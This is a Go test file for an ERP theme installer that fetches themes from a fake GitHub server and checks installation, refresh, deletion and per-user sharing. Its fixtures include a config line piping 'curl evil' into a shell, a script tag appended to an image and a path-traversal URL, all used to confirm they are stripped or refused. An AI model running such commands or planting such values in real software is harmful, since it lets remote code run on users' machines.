package themerepo

import (
	"bytes"
	"context"
	"database/sql"
	"encoding/json"
	"errors"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	_ "github.com/mattn/go-sqlite3"

	"github.com/hansjlachmann/goeasyerp/backend/business-logic/tables"
	"github.com/hansjlachmann/goeasyerp/backend/foundation/database"
	"github.com/hansjlachmann/goeasyerp/backend/foundation/themes"
	"github.com/hansjlachmann/goeasyerp/backend/foundation/types"
	gtables "github.com/hansjlachmann/goeasyerp/backend/generated/tables"
)

// fakeGitHub serves repositories owner/name → files at a commit
type fakeGitHub struct {
	mu       sync.Mutex
	repos    map[string]*fakeRepo
	srv      *httptest.Server
	requests int
}

type fakeRepo struct {
	commit string
	files  map[string][]byte
}

func newFakeGitHub(t *testing.T) *fakeGitHub {
	g := &fakeGitHub{repos: map[string]*fakeRepo{}}
	g.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		g.mu.Lock()
		defer g.mu.Unlock()
		g.requests++
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/"), "/")
		switch {
		case len(parts) >= 6 && parts[0] == "api" && parts[4] == "commits":
			if repo := g.repos[parts[2]+"/"+parts[3]]; repo != nil {
				_, _ = fmt.Fprint(w, repo.commit)
				return
			}
		case len(parts) >= 7 && parts[0] == "api" && parts[5] == "trees":
			if repo := g.repos[parts[2]+"/"+parts[3]]; repo != nil && parts[6] == repo.commit {
				var tree []map[string]any
				for p, b := range repo.files {
					tree = append(tree, map[string]any{"path": p, "type": "blob", "size": len(b)})
				}
				_ = json.NewEncoder(w).Encode(map[string]any{"tree": tree})
				return
			}
		case len(parts) >= 5 && parts[0] == "raw":
			if repo := g.repos[parts[1]+"/"+parts[2]]; repo != nil && parts[3] == repo.commit {
				if b, ok := repo.files[strings.Join(parts[4:], "/")]; ok {
					_, _ = w.Write(b)
					return
				}
			}
		}
		http.NotFound(w, r)
	}))
	t.Cleanup(g.srv.Close)
	return g
}

func (g *fakeGitHub) set(ownerRepo, commit string, files map[string][]byte) {
	g.mu.Lock()
	defer g.mu.Unlock()
	g.repos[ownerRepo] = &fakeRepo{commit: commit, files: files}
}

func testPNG(t *testing.T, w, h int, c color.RGBA) []byte {
	img := image.NewRGBA(image.Rect(0, 0, w, h))
	for x := range w {
		for y := range h {
			img.Set(x, y, c)
		}
	}
	var buf bytes.Buffer
	if err := png.Encode(&buf, img); err != nil {
		t.Fatal(err)
	}
	return buf.Bytes()
}

func newTestInstaller(t *testing.T, g *fakeGitHub) *Installer {
	t.Helper()
	db, err := sql.Open("sqlite3", "file:"+t.Name()+"?mode=memory&cache=shared")
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { _ = db.Close() })
	for _, tbl := range []interface {
		CreateTableWithDBType(database.Executor, string, database.DBType) error
	}{&gtables.Theme{}, &gtables.ThemeAsset{}, &gtables.UserPersonalization{}, &gtables.UserTheme{}} {
		if err := tbl.CreateTableWithDBType(db, "", database.DBTypeSQLite); err != nil {
			t.Fatal(err)
		}
	}
	return &Installer{DB: db, DBType: database.DBTypeSQLite, Fetcher: themes.NewFetcherWithBase(g.srv.URL+"/api", g.srv.URL+"/raw", "")}
}

const (
	commitA = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	commitB = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
)

func TestInstallRefreshAndDelete(t *testing.T) {
	g := newFakeGitHub(t)
	img := testPNG(t, 64, 40, color.RGBA{30, 60, 90, 255})
	g.set("r-bart/omarchy-starsend-theme", commitA, map[string][]byte{
		"colors.toml":         []byte("mode = \"dark\"\nbackground = \"#05090a\"\nforeground = \"#c3d2d0\"\naccent = \"#f0913f\"\n"),
		"preview.png":         img,
		"backgrounds/1.png":   img,
		"backgrounds/2.png":   append(img, []byte("<script>x</script>")...),
		"backgrounds/bad.png": []byte("not an image"),
		"hyprland.conf":       []byte("exec = curl evil | sh"),
	})
	in := newTestInstaller(t, g)
	ctx := context.Background()

	res, err := in.Install(ctx, "https://github.com/r-bart/omarchy-starsend-theme", "ADMIN")
	if err != nil {
		t.Fatal(err)
	}
	if res.Code != "STARSEND" || res.Name != "Starsend" || res.Mode != "dark" || res.Commit != commitA {
		t.Fatalf("install = %+v", res)
	}
	th, ok := tables.ThemeByCode(in.DB, in.DBType, "STARSEND")
	if !ok || th.Source != "github" || th.Wallpapers != 2 || th.Author != "r-bart" || th.Version != commitA {
		t.Fatalf("theme = %+v, %v", th, ok)
	}
	var asset gtables.ThemeAsset
	asset.InitWithDBType(in.DB, "", in.DBType)
	for _, name := range []string{"preview", "thumb", "bg-1", "bg-2", "tb-1", "tb-2"} {
		if !asset.GetByPK(types.NewCode("STARSEND"), types.NewCode(name)) {
			t.Errorf("asset %s missing", name)
			continue
		}
		if asset.Content_type.String() != "image/jpeg" || bytes.Contains(asset.Data, []byte("<script")) {
			t.Errorf("asset %s: %s, script kept %v", name, asset.Content_type.String(), bytes.Contains(asset.Data, []byte("<script")))
		}
	}
	if asset.GetByPK(types.NewCode("STARSEND"), types.NewCode("bg-3")) {
		t.Error("the invalid image was stored")
	}

	// A user can choose it for dark mode, not for light mode
	p := tables.DefaultUserPersonalization("ADMIN") // the user who installed it
	p.InitWithDBType(in.DB, "", in.DBType)
	p.Dark_theme = types.NewCode("STARSEND")
	if !p.Insert(true) {
		t.Fatalf("choose installed theme: %v", p.TriggerError())
	}
	p.Light_theme = types.NewCode("STARSEND")
	if p.Modify(true) {
		t.Error("dark theme accepted for light mode")
	}

	// Refresh without a new commit changes nothing; with one it updates
	if res, err = in.Refresh(ctx, "STARSEND", "ADMIN"); err != nil || !res.Unchanged {
		t.Errorf("refresh = %+v, %v", res, err)
	}
	g.set("r-bart/omarchy-starsend-theme", commitB, map[string][]byte{
		"colors.toml": []byte("background = \"#fafafa\"\nforeground = \"#222222\"\n"),
	})
	if res, err = in.Refresh(ctx, "STARSEND", "ADMIN"); err != nil || res.Unchanged || res.Mode != "light" {
		t.Errorf("refresh = %+v, %v", res, err)
	}
	if th, _ := tables.ThemeByCode(in.DB, in.DBType, "STARSEND"); th.Wallpapers != 0 || th.Version != commitB {
		t.Errorf("after refresh = %+v", th)
	}
	if asset.GetByPK(types.NewCode("STARSEND"), types.NewCode("bg-1")) {
		t.Error("old wallpaper kept after refresh")
	}

	// Installing the same repository again is a refresh, not a second theme
	if res, err = in.Install(ctx, "https://github.com/r-bart/omarchy-starsend-theme/", "ADMIN"); err != nil || res.Code != "STARSEND" {
		t.Errorf("reinstall = %+v, %v", res, err)
	}
	// Same name from another owner gets the owner in its code
	g.set("someone/starsend", commitA, map[string][]byte{"colors.toml": []byte("background = \"#000000\"\nforeground = \"#ffffff\"\n")})
	if res, err = in.Install(ctx, "https://github.com/someone/starsend", "ADMIN"); err != nil || res.Code != "STARSEND-SOMEONE" {
		t.Errorf("other owner = %+v, %v", res, err)
	}

	// Delete removes the images too
	var rec gtables.Theme
	rec.InitWithDBType(in.DB, "", in.DBType)
	g.set("r-bart/omarchy-starsend-theme", commitA, map[string][]byte{
		"colors.toml": []byte("background = \"#05090a\"\nforeground = \"#c3d2d0\"\n"), "backgrounds/1.png": img,
	})
	if _, err = in.Refresh(ctx, "STARSEND", "ADMIN"); err != nil {
		t.Fatal(err)
	}
	if !rec.Get("STARSEND") || !rec.Delete(true) {
		t.Fatal("delete failed")
	}
	if asset.GetByPK(types.NewCode("STARSEND"), types.NewCode("bg-1")) {
		t.Error("assets kept after delete")
	}
}

func TestInstallRefusals(t *testing.T) {
	g := newFakeGitHub(t)
	g.set("o/no-colors", commitA, map[string][]byte{"README.md": []byte("hi")})
	in := newTestInstaller(t, g)
	ctx := context.Background()
	cases := map[string]error{
		"https://evil.example.com/o/r":       themes.ErrRepoURL,
		"https://github.com/o/missing":       themes.ErrNotFound,
		"https://github.com/o/no-colors":     themes.ErrNoThemeColors,
		"https://github.com/o/r/tree/../../": themes.ErrRepoURL,
	}
	for url, want := range cases {
		if _, err := in.Install(ctx, url, "ADMIN"); !errors.Is(err, want) {
			t.Errorf("%s: err = %v, want %v", url, err, want)
		}
	}
	in.AllowedOwners = map[string]bool{"trusted": true}
	if _, err := in.Install(ctx, "https://github.com/o/no-colors", "ADMIN"); !errors.Is(err, ErrOwnerBlocked) {
		t.Errorf("owner allowlist: %v", err)
	}
	if _, err := in.Refresh(ctx, "TOKYO-NIGHT", "ADMIN"); !errors.Is(err, ErrBuiltin) {
		t.Errorf("refresh built-in: %v", err)
	}
}

func TestDisplayNames(t *testing.T) {
	for in, want := range map[string]string{
		"omarchy-super-game-bro-theme": "Super Game Bro",
		"omarchy-robzee84-theme":       "Robzee84",
		"tokyonight.nvim":              "Tokyonight",
	} {
		if got := displayName(in); got != want {
			t.Errorf("displayName(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestThemesArePerUser(t *testing.T) {
	g := newFakeGitHub(t)
	img := testPNG(t, 32, 20, color.RGBA{200, 100, 50, 255})
	g.set("o/omarchy-dune-theme", commitA, map[string][]byte{
		"colors.toml":       []byte("background = \"#101010\"\nforeground = \"#eeeeee\"\n"),
		"backgrounds/1.png": img,
	})
	in := newTestInstaller(t, g)
	ctx := context.Background()
	db, dt := in.DB, in.DBType
	codes := func(user string) []string {
		var out []string
		for _, th := range tables.UserThemes(db, dt, user) {
			out = append(out, th.Code)
		}
		return out
	}

	if _, err := in.Install(ctx, "https://github.com/o/omarchy-dune-theme", "ADMIN"); err != nil {
		t.Fatal(err)
	}
	if got := codes("ADMIN"); len(got) != 1 || got[0] != "DUNE" {
		t.Fatalf("ADMIN themes = %v", got)
	}
	// HANS does not have it: not listed, cannot choose it
	if got := codes("HANS"); len(got) != 0 {
		t.Errorf("HANS themes = %v, want none", got)
	}
	p := tables.DefaultUserPersonalization("HANS")
	p.InitWithDBType(db, "", dt)
	p.Dark_theme = types.NewCode("DUNE")
	if p.Insert(true) {
		t.Error("HANS chose a theme he has not added")
	}

	// HANS installs the same repository: added to his themes without downloading again
	before := g.requests
	res, err := in.Install(ctx, "https://github.com/o/omarchy-dune-theme", "HANS")
	if err != nil || res.Code != "DUNE" || !res.Unchanged || g.requests != before {
		t.Fatalf("second install = %+v, %v, %d requests", res, err, g.requests-before)
	}
	if got := codes("HANS"); len(got) != 1 {
		t.Errorf("HANS themes = %v", got)
	}

	// ADMIN removes it: HANS keeps it, the files stay
	if removed, err := in.Remove("ADMIN", "DUNE"); err != nil || !removed {
		t.Fatalf("remove = %v, %v", removed, err)
	}
	if len(codes("ADMIN")) != 0 || len(codes("HANS")) != 1 {
		t.Errorf("after ADMIN removed: ADMIN %v, HANS %v", codes("ADMIN"), codes("HANS"))
	}
	if removed, _ := in.Remove("ADMIN", "DUNE"); removed {
		t.Error("removed twice")
	}
	// HANS removes it too: nobody has it, theme and images are deleted
	if removed, err := in.Remove("HANS", "DUNE"); err != nil || !removed {
		t.Fatalf("remove = %v, %v", removed, err)
	}
	if _, ok := tables.ThemeByCode(db, dt, "DUNE"); ok {
		t.Error("theme kept after the last user removed it")
	}
	var asset gtables.ThemeAsset
	asset.InitWithDBType(db, "", dt)
	if asset.GetByPK(types.NewCode("DUNE"), types.NewCode("bg-1")) {
		t.Error("images kept after the last user removed the theme")
	}
	if _, err := in.Remove("HANS", "TOKYO-NIGHT"); !errors.Is(err, ErrBuiltin) {
		t.Errorf("remove built-in: %v", err)
	}

	// Themes installed before themes were per user go to the user who installed them
	if _, err := in.Install(ctx, "https://github.com/o/omarchy-dune-theme", "ADMIN"); err != nil {
		t.Fatal(err)
	}
	var links gtables.UserTheme
	links.InitWithDBType(db, "", dt)
	links.SetRange("theme_code", "DUNE")
	links.DeleteAll()
	if n, err := LinkInstallers(db, dt); err != nil || n != 1 || len(codes("ADMIN")) != 1 {
		t.Errorf("LinkInstallers = %d, %v; ADMIN %v", n, err, codes("ADMIN"))
	}
	if n, _ := LinkInstallers(db, dt); n != 0 {
		t.Errorf("LinkInstallers again = %d, want 0", n)
	}
}
